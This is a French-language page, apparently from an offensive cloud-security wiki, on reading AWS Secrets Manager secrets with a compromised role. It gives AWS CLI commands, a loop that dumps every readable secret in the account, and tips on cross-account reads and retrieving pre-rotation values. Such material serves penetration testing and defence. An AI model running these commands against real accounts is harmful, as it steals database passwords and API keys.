---
title: "Secrets Manager : GetSecretValue sur les secrets stockés"
order: 1
description: "secretsmanager:GetSecretValue pour lire les mots de passe de bases de données, clés d'API et autres secrets stockés, et les lister à l'échelle du compte."
keywords:
  - Secrets Manager
  - GetSecretValue
  - secrets
  - clés d'API
  - rotation
---

# Secrets Manager

Secrets Manager stocke des identifiants que les applications récupèrent à l'exécution, si bien que `secretsmanager:GetSecretValue` donne un accès direct aux mots de passe, clés d'API et chaînes de connexion du compte. L'autorisation est fréquemment accordée largement aux rôles applicatifs, ce qui en fait une cible de choix dès que vous détenez un tel rôle.

## Lister et lire

```bash
aws secretsmanager list-secrets --query 'SecretList[].[Name,ARN]' --output text
aws secretsmanager get-secret-value --secret-id <name-or-arn> \
  --query SecretString --output text
```

## Balayer tout ce qui est lisible

```bash
for s in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text); do
  echo "== $s =="
  aws secretsmanager get-secret-value --secret-id "$s" --query SecretString --output text 2>/dev/null
done
```

## Notes d'exploitation

- Lire un secret ne le fait pas pivoter, de sorte que les identifiants de bases de données et de services tiers récupérés continuent de fonctionner.
- Les stratégies de ressource sur un secret peuvent autoriser des lectures inter-comptes ; vérifiez `get-resource-policy` lorsqu'un rôle couvre plusieurs comptes.
- Un `VersionStage` à `AWSPREVIOUS` renvoie souvent encore la valeur antérieure, utile lorsque la valeur courante a été pivotée après une exposition.

## Outils

- **AWS CLI** (`secretsmanager get-secret-value`).
- **Pacu** (`secrets__enum`) : extraction en masse de Secrets Manager et Parameter Store.

## Références

- [AWS: GetSecretValue](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetSecretValue.html)
- [HackTricks Cloud: Secrets Manager](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-secrets-manager-enum.html)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
